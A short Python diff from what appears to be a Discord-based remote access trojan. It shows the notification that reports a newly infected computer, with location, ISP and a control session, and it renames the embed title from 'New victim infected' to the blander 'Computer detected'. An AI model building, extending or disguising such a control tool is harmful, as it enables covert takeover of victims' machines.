@@ -415,7 +415,7 @@ async def on_ready():
         region = "알 수 없음"
         isp = "알 수 없음"
     embed = discord.Embed(
-        title="새로운 희생자 감염됨",
+        title="컴퓨터 감지됨",
         description="*새로운 제어 세션이 성공적으로 초기화되었습니다. 모든 명령어는 `!help`를 입력하세요.*",
         color=0x00aaff
     )
